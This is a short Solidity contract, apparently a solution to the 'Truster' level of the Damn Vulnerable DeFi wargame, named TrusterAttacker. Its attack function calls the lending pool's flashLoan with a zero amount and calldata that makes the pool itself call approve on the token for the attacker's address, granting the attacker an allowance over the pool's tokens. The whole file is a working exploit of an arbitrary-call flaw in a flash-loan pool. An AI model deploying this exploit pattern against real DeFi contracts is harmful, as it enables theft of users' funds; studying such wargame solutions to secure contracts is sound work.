// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./TrusterLenderPool.sol";

contract TrusterAttacker {

    IERC20 public immutable damnValuableToken;
    TrusterLenderPool private immutable pool;

    constructor (address tokenAddress, address poolAddress) {
        damnValuableToken = IERC20(tokenAddress);
        pool = TrusterLenderPool(poolAddress);
    }

    function attack(uint256 amount, address attacker) external {
        pool.flashLoan(0, address(this), address(damnValuableToken), abi.encodeWithSignature("approve(address,uint256)", attacker, amount));
    }

    receive () external payable {}
}
